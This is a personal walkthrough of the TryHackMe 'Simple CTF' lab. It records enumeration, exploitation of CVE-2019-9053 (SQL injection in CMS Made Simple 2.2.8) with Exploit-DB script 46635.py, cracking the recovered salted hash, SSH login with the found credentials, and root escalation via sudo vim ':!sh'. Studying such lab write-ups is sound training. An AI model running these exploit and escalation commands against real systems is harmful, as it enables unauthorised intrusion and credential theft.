# TryHackMe — Simple CTF Walkthrough

> **Room:** Simple CTF  
> **Platform:** TryHackMe  
> **Focus:** Enumeration, web exploitation, credential recovery, SSH, and Linux privilege escalation  
> **Purpose:** Personal study notes / future reference

---

## 1. Target Information

Target IP used during the room:

```text
10.48.142.28
```

> Note: the target IP changed during the session. Earlier enumeration used `10.48.131.189`, while SSH was later performed against `10.48.142.28`. Always use the IP currently shown by TryHackMe.

---

# 2. Initial Enumeration

## Nmap

The first useful scan was:

```bash
nmap -sCV <TARGET_IP>
```

Important results:

```text
21/tcp    open    ftp     vsftpd 3.0.3
80/tcp    open    http    Apache httpd 2.4.18 (Ubuntu)
2222/tcp  open    ssh     OpenSSH 7.2p2 Ubuntu
```

### What this told me

- **21/FTP** → investigate anonymous FTP
- **80/HTTP** → investigate the web server
- **2222/SSH** → possible later remote login
- SSH was running on **2222**, not the usual port 22.

Nmap also reported:

```text
Anonymous FTP login allowed
```

and discovered:

```text
robots.txt
```

---

# 3. Checking robots.txt

I requested:

```bash
curl http://<TARGET_IP>/robots.txt
```

The interesting entries included:

```text
Disallow: /
Disallow: /openemr-5_0_1_3
```

The OpenEMR path returned:

```text
HTTP/1.1 404 Not Found
```

So I did not continue pursuing that path.

### Lesson

A discovery from automated enumeration should be verified manually. A path in `robots.txt` does not automatically mean it is accessible or relevant.

---

# 4. Web Directory Enumeration

I used Gobuster:

```bash
gobuster dir -u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

Important result:

```text
simple    (Status: 301) --> http://<TARGET_IP>/simple/
```

So I investigated:

```text
http://<TARGET_IP>/simple/
```

---

# 5. Identifying the CMS

The HTML source revealed:

```text
CMS Made Simple
```

The footer gave the exact version:

```text
CMS Made Simple version 2.2.8
```

This was important because vulnerability research should be based on the **exact software and version**, not just the product name.

---

# 6. Vulnerability Research with SearchSploit

I searched Kali's local Exploit-DB database:

```bash
searchsploit "CMS Made Simple 2.2.8"
```

The result was:

```text
CMS Made Simple < 2.2.10 - SQL Injection
php/webapps/46635.py
```

This identified a known SQL injection affecting versions below 2.2.10.

Since the target was:

```text
CMS Made Simple 2.2.8
```

the target version was inside the affected range.

### Important lesson

The process was:

```text
Identify software
        ↓
Identify exact version
        ↓
Search vulnerability databases
        ↓
Compare target version with affected versions
        ↓
Investigate the matching vulnerability
```

I did not know beforehand that CMS Made Simple was vulnerable.

---

# 7. Understanding Exploit 46635.py

I copied the exploit locally with:

```bash
searchsploit -m 46635
```

This created:

```text
46635.py
```

The exploit is for:

```text
CVE-2019-9053
```

and uses a **time-based SQL injection** against vulnerable CMS Made Simple versions.

The script was originally written for Python 2.

When I tried:

```bash
python3 46635.py -u http://<TARGET_IP>/simple/
```

I received a Python 3 syntax error because the script uses old Python 2 syntax.

I checked:

```bash
python2 --version
```

and Python 2.7.18 was available.

The exploit then complained about the missing `termcolor` module.

Because `termcolor` was only being used for terminal output formatting, I removed/replaced the `cprint()` and `colored()` display calls rather than changing the SQL injection logic.

### Important lesson

The exploit's actual purpose is to use the SQL injection to retrieve information from the CMS database.

It can recover things such as:

- Salt
- Username
- Email
- Password hash

It also has an optional password-cracking function.

---

# 8. SQL Injection Results

Running the exploit successfully produced:

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

The password value was a hash, not plaintext.

The script was then used with the RockYou wordlist:

```bash
python2 46635.py \
-u http://<TARGET_IP>/simple/ \
--crack \
-w /usr/share/wordlists/rockyou.txt
```

The result was:

```text
[+] Password cracked: secret
```

So the recovered credentials were:

```text
Username: mitch
Password: secret
```

### Important concept: salt + hash

The exploit's cracking function effectively tests:

```text
MD5(salt + candidate_password)
```

against the recovered hash.

This demonstrates why knowing the password hash alone is not necessarily enough when a salt is involved.

---

# 9. SSH Access

Earlier Nmap showed SSH on port **2222**.

I used:

```bash
ssh mitch@<TARGET_IP> -p 2222
```

with:

```text
Password: secret
```

The login succeeded.

Inside the machine:

```bash
whoami
```

returned:

```text
mitch
```

The home directory was:

```text
/home/mitch
```

and it contained:

```text
user.txt
```

The user flag was successfully retrieved.

---

# 10. Privilege Enumeration

Before attempting privilege escalation, I checked:

```bash
id
```

Result:

```text
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

Then:

```bash
sudo -l
```

The important result was:

```text
(root) NOPASSWD: /usr/bin/vim
```

This was the key privilege-escalation finding.

It means `mitch` can execute Vim as **root** without entering a sudo password.

---

# 11. SUID Enumeration

I also checked for SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This returned standard SUID programs such as:

```text
/bin/su
/bin/ping
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
...
```

There was no need to pursue these because `sudo -l` had already revealed a direct and simpler privilege-escalation path through Vim.

### What the command means

```text
find /
```

Search from the filesystem root.

```text
-perm -4000
```

Look for files with the SUID permission bit.

```text
-type f
```

Only regular files.

```text
2>/dev/null
```

Hide permission-denied/error messages.

---

# 12. Understanding the Vim Privilege Escalation

Vim is normally a terminal text editor.

However, in this room:

```text
mitch
   ↓
sudo /usr/bin/vim
   ↓
Vim runs as root
   ↓
Vim can execute shell commands
   ↓
root shell
```

I started Vim with:

```bash
sudo /usr/bin/vim
```

From inside Vim, I used:

```text
:!sh
```

This launches a shell from Vim.

Because Vim itself was started through sudo as root, the resulting shell had root privileges.

I verified the privilege with:

```bash
whoami
```

which returned:

```text
root
```

---

# 13. Finding the Root User's Home

Instead of blindly assuming the root home directory, I learned that it can be discovered using:

```bash
echo $HOME
```

For the root user, this normally points to:

```text
/root
```

The root flag can then be located from the root user's home directory.

---

# 14. Additional User

The room also asked:

> Is there any other user in the home directory? What's its name?

Checking:

```bash
ls /home
```

revealed another user:

```text
sunbath
```

Answer:

```text
sunbath
```

---

# 15. Complete Attack Chain

The entire room can be summarized as:

```text
Nmap
  ↓
21 FTP / 80 HTTP / 2222 SSH
  ↓
Gobuster
  ↓
/simple/
  ↓
CMS Made Simple 2.2.8
  ↓
SearchSploit
  ↓
CVE-2019-9053
  ↓
Exploit 46635.py
  ↓
Time-based SQL injection
  ↓
Recover salt + username + password hash
  ↓
RockYou password cracking
  ↓
mitch : secret
  ↓
SSH on port 2222
  ↓
mitch shell
  ↓
sudo -l
  ↓
(root) NOPASSWD: /usr/bin/vim
  ↓
Vim as root
  ↓
:!sh
  ↓
root shell
  ↓
Root flag
```

---

# 16. Commands Used

## Enumeration

```bash
nmap -sCV <TARGET_IP>
```

```bash
gobuster dir -u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

```bash
curl http://<TARGET_IP>/robots.txt
```

## CMS identification

```bash
curl http://<TARGET_IP>/simple/
```

## Vulnerability research

```bash
searchsploit "CMS Made Simple 2.2.8"
```

```bash
searchsploit -m 46635
```

## Exploit

```bash
python2 46635.py -u http://<TARGET_IP>/simple/
```

## Password cracking

```bash
python2 46635.py \
-u http://<TARGET_IP>/simple/ \
--crack \
-w /usr/share/wordlists/rockyou.txt
```

## SSH

```bash
ssh mitch@<TARGET_IP> -p 2222
```

## Linux enumeration

```bash
whoami
```

```bash
id
```

```bash
pwd
```

```bash
ls -la
```

```bash
sudo -l
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

## Privilege escalation

```bash
sudo /usr/bin/vim
```

Inside Vim:

```text
:!sh
```

Then:

```bash
whoami
```

---

# 17. What I Learned

### Enumeration
- Nmap identifies open ports and services.
- Gobuster can discover hidden web directories.
- `robots.txt` can provide additional paths, but every finding should be verified.

### Vulnerability identification
- Identify the application first.
- Get the exact version.
- Search vulnerability databases such as SearchSploit.
- Compare the target version against the affected version range.

### Exploitation
- CVE-2019-9053 is a time-based SQL injection affecting vulnerable CMS Made Simple versions.
- The exploit can extract database information without normal CMS authentication.
- Password hashes and salts can be recovered and tested against wordlists.

### Linux
- SSH does not always run on port 22.
- `sudo -l` is an important privilege-enumeration command.
- SUID files are another useful area to investigate.
- A program that can execute commands and is allowed to run as root through sudo can become a privilege-escalation path.

### Most important mindset

Don't start with:

> "What exploit should I use?"

Start with:

```text
What is exposed?
        ↓
What software is running?
        ↓
What version is it?
        ↓
Is that version vulnerable?
        ↓
What does the vulnerability allow?
        ↓
How can I use the resulting access?
        ↓
How can I escalate privileges?
```

---

# 18. Room Status

**Simple CTF — COMPLETED ✅**

Skills practiced:

- [x] Nmap
- [x] Gobuster
- [x] HTTP enumeration
- [x] CMS identification
- [x] SearchSploit
- [x] CVE research
- [x] SQL injection
- [x] Hash + salt concepts
- [x] Password cracking with RockYou
- [x] SSH
- [x] Linux enumeration
- [x] sudo enumeration
- [x] SUID enumeration
- [x] Vim-based privilege escalation
- [x] Root access

---

## Personal Notes

This room helped me understand the full process instead of only memorizing commands:

**Enumeration → Identification → Vulnerability Research → Exploitation → Credential Recovery → Initial Access → Privilege Escalation → Root**

I also learned why each command was being used and where tools such as SearchSploit and exploit files like `46635.py` actually come from.
